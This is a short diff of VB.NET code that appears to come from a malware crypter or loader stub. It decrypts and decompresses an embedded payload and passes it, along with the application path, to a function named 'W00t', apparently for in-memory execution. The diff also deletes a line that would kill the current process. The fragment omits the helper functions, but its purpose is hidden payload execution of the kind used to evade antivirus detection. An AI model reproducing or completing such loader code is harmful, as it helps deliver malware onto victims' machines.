@@ -7,7 +7,6 @@
         NewByts = Loop1(NewByts, Payload, Start)
         NewByts = Loop2(NewByts)
         W00t(AES_Decrypt(Decompress(NewByts)), AppPath)
-        Process.GetCurrentProcess.Kill()
     End Sub
     Public Shared Function Decompress(bytes As Byte()) As Byte()
         Dim stream = New IO.MemoryStream()
